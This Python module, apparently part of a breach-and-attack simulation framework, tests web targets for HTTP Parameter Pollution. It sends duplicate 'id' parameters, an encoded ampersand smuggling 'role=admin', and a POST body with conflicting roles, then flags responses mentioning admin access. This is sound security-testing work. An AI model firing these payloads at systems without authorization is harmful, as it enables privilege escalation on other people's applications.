"""HTTP Parameter Pollution testing. MITRE ATT&CK: T1190"""
from __future__ import annotations
import uuid
from typing import Any
from bas.core.executor import AttackRequest, AttackResponse
from bas.core.scope import AuthorizationLevel
from bas.modules.base_module import BaseAttackModule, ModuleMetadata, ModuleResult, VulnStatus

class HPPModule(BaseAttackModule):
    @property
    def metadata(self) -> ModuleMetadata:
        return ModuleMetadata(name="hpp", description="HTTP Parameter Pollution", category="hpp",
            mitre_technique_ids=["T1190"], mitre_technique_names=["Exploit Public-Facing Application"],
            auth_level_required=AuthorizationLevel.LOW_IMPACT, owasp_category="A03:2021 - Injection",
            cwe_ids=["CWE-235"], tags=["hpp", "parameter", "injection"])

    async def _get_payloads(self, target: str, options: dict[str, Any]) -> list[str]:
        return ["duplicate_param", "array_param", "encoded_amp"]

    def _build_requests(self, target: str, payloads: list[str], options: dict[str, Any]) -> list[AttackRequest]:
        path = options.get("path", "/")
        return [
            AttackRequest(request_id=f"hpp-{uuid.uuid4().hex[:8]}", target=target, method="GET",
                path=f"{path}?id=1&id=2&id=admin"),
            AttackRequest(request_id=f"hpp-{uuid.uuid4().hex[:8]}", target=target, method="GET",
                path=f"{path}?id=1%26role%3Dadmin"),
            AttackRequest(request_id=f"hpp-{uuid.uuid4().hex[:8]}", target=target, method="POST",
                path=path, body="id=1&id=admin&role=user&role=admin",
                content_type="application/x-www-form-urlencoded"),
        ]

    def _analyze_response(self, request: AttackRequest, response: AttackResponse, payload: str) -> ModuleResult:
        body = response.body_text.lower()
        if response.status_code == 200 and ("admin" in body or "elevated" in body):
            return ModuleResult(module_name="hpp", target=request.target, status=VulnStatus.POTENTIALLY_VULNERABLE,
                payload_used=payload, response_code=response.status_code, response_body_preview=response.body_text[:500],
                elapsed_ms=response.elapsed_ms, evidence="HPP: duplicate parameters may affect server logic",
                severity="medium", mitre_technique_id="T1190")
        return ModuleResult(module_name="hpp", target=request.target, status=VulnStatus.NOT_VULNERABLE,
            payload_used=payload, response_code=response.status_code, elapsed_ms=response.elapsed_ms)
